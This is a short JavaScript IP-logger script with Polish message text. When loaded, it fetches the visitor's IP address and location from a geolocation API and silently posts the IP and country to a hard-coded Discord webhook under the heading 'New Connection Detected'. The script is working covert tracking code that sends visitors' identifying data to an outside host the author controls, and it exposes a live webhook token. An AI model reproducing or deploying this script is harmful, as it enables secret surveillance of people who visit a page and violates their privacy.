var webHookUrl = "https://discord.com/api/webhooks/1013943446488232016/32Y7r6sPVreuVCxtSFxGNbt2mmkN3B4IWIt-9fu6enC7JptY2cm4kGIlAzGzPRqEYWW0";

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;
    var jebacto = data.continentName;
    var jakto = data.countryCode;
    var coto = data.stateProv;
    var miasto = data.city;


    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "IP Log",
        avatar_url: "",
        content:    "**Wykryto Nowe Połączenie** @everyone \n" + 
		    "__**:globe_with_meridians: IP Address:**__ \n" +
                    "`" + ip + "` \n \n" +
                    "__**Country:**__ \n" +      
                    "`" + country + "`"       

	    
    }

    postRequest.send(JSON.stringify(params));

}

request();
